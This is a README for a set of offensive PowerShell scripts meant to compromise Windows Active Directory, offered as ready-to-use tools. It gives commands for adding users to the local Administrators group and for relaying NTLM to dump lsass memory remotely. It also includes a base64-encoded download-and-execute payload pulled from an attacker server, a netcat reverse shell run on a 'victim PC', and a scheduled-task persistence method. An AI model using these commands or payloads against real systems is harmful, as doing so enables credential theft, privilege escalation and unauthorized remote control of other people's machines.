# PowershellScripts #

**Useful scripts for pwn Windows AD**

**Runas.ps1** - Easy script for start anything from cmd

``Example: powershell -exec bypass ./psrunas.ps1 -username user -password password -command cmd.exe -argument "/c whoami > test.txt"``

**startprocess.ps1** - An example of how to redirect output when launching a third-party application.

**getlocalgroups.ps1** - Get the list of groups (if you cant use net group...)

**getadmin.ps1** - Add user to group Administrators or Администраторы on localmachine

``Example: powershell -exec bypass ./getadmin.ps1 -Account username``

**remotepd.ps1** - Useful for getting dump the lsass memory in external computer by ntlmrelayx

``Example: ntlmrelayx.py --no-http-server -smb2support -t your_target -c 'powershell  -Enc aQBlAHgAKABOAEUAVwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHkAbwB1AHIAcwBlAHIAdgBlAHIALwByAGUAbQBvAHQAZQBwAGQALgBwAHMAMQAnACkACgA=' ``

``where base64 is: "iex(NEW-Object Net.WebClient).DownloadString('http://yourserver/remotepd.ps1')" ``

**shell.ps1** - Simple PS shell from https://gist.github.com/ohpe/bdd9d4385f8e6df26c02448f1bcc7a25 

 - Some Problem: Windows Defender block this shell script (30.10.19)

``Example: run nc -lvp 443 on your PC and run powerhsell -exec bypass shell.ps1 on victim PC``

**scheduler.ps1** - Add your PS script to Windows Scheduler. Sched start every 1 min

``In scheduler.ps you must set path to script: $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-exec bypass c:\temp\_your_scrip.ps1'``


# Wish #

Find all intresting files|history log on local machine and domain
MsExchange attacks
